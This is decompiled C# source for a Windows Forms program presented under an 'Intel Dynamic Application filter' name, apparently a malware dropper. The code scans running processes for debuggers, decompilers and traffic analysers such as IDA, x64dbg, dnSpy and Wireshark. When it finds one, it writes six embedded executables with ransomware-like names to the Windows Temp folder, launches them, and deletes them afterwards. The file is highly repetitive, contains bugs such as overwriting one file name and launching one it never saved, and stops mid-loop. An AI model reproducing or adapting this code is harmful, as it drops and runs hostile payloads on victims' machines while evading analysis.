using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Intel_R__Dynamic_Application_filter.My;
using Intel_R__Dynamic_Application_filter.My.Resources;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Intel_R__Dynamic_Application_filter;

[DesignerGenerated]
public class Form1 : Form
{
	private const int V = 3;

	private IContainer components;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	public void save(string FilePath, object File)
	{
		byte[] array = (byte[])File;
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(FilePath, array, true);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_BackColor(Color.Black);
		((Form)this).set_TransparencyKey(((Form)this).get_BackColor());
		Timer1.Start();
		string text = "ollydbg";
		string text2 = "ida";
		string text3 = "ida64";
		string text4 = "idag";
		string text5 = "idag64";
		string text6 = "idaw";
		string text7 = "idaw64";
		string text8 = "idaq";
		string text9 = "idaq64";
		string text10 = "idau";
		string text11 = "idau64";
		string text12 = "scylla";
		string text13 = "scylla_x64";
		string text14 = "scylla_x86";
		string text15 = "protection_id";
		string text16 = "x64dbg";
		string text17 = "x32dbg";
		string text18 = "windbg";
		string text19 = "reshacker";
		string text20 = "ImportREC";
		string text21 = "IMMUNITYDEBUGGER";
		string text22 = "MegaDumper";
		string text23 = "Reflector";
		string text24 = "DotNetResolver";
		string text25 = "ProcessHacker";
		string text26 = "ExtremeDumper";
		string text27 = "Winabler";
		string text28 = "Charles";
		string text29 = "Wireshark";
		string text30 = "Fiddler";
		string text31 = "Cheat Engine";
		string text32 = "VB Decompiler";
		string text33 = "ResourceHacker";
		string text34 = "gct0lly";
		string text35 = "Debuggy1-9f";
		string text36 = "Dumper64";
		string text37 = "ollyice";
		string text38 = "CFF Explorer";
		string text39 = "dnSpy";
		string text40 = "dnSpy-x86";
		string text41 = "JustDecompiler";
		string text42 = "ILSpy";
		string text43 = "De4Dot";
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (Operators.CompareString(text43, process.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array2 = processes;
		foreach (Process process2 in array2)
		{
			if (Operators.CompareString(text42, process2.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array3 = processes;
		foreach (Process process3 in array3)
		{
			if (Operators.CompareString(text, process3.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array4 = processes;
		foreach (Process process4 in array4)
		{
			if (Operators.CompareString(text2, process4.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array5 = processes;
		foreach (Process process5 in array5)
		{
			if (Operators.CompareString(text3, process5.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array6 = processes;
		foreach (Process process6 in array6)
		{
			if (Operators.CompareString(text4, process6.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array7 = processes;
		foreach (Process process7 in array7)
		{
			if (Operators.CompareString(text5, process7.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array8 = processes;
		foreach (Process process8 in array8)
		{
			if (Operators.CompareString(text6, process8.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array9 = processes;
		foreach (Process process9 in array9)
		{
			if (Operators.CompareString(text7, process9.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
